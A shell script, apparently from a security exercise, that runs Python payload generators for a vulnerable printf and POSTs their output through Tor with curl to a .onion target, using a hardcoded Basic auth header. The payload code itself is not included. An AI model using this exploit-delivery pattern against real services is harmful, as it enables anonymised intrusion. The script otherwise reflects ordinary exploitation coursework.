#!/bin/sh

whattoexecute=$2

#argument $1 is the input from the "broken" printf
#argument $2 is to choose which question we want to execute

if (($whattoexecute==3))
then
    question3=$(python3 question3.py $1)
    question3=${question3:2}
    question3=${question3%?}
    echo -en $question3 | curl --trace - --socks5-hostname localhost:9050 'zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html' -X POST -i -H 'Authorization: Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==' -H 'Connection: keep-alive' --data-binary @- -H 'Content-Length: 0'


# Question 4
elif (($whattoexecute==4))
then
    question4=$(python3 new_call_send_file.py $1)
    question4=${question4:2}
    question4=${question4%?}
    echo -en $question4 | curl --trace - --socks5-hostname localhost:9050 'zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html' --http0.9 -X POST -i -H 'Authorization: Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==' -H 'Connection: keep-alive' --data-binary @- -H 'Content-Length: 0'



# Question 5
elif (($whattoexecute==5))
then
    question5=$(python3 find_ip2.py $1)
    question5=${question5:2}
    question5=${question5%?}
    echo -en $question5 | curl --trace -  --socks5-hostname localhost:9050 'zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html' --http0.9 -X POST -i -H 'Authorization: Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ=='  -H 'Connection: keep-alive'  --data-binary @- -H 'Content-Length: 0'
fi
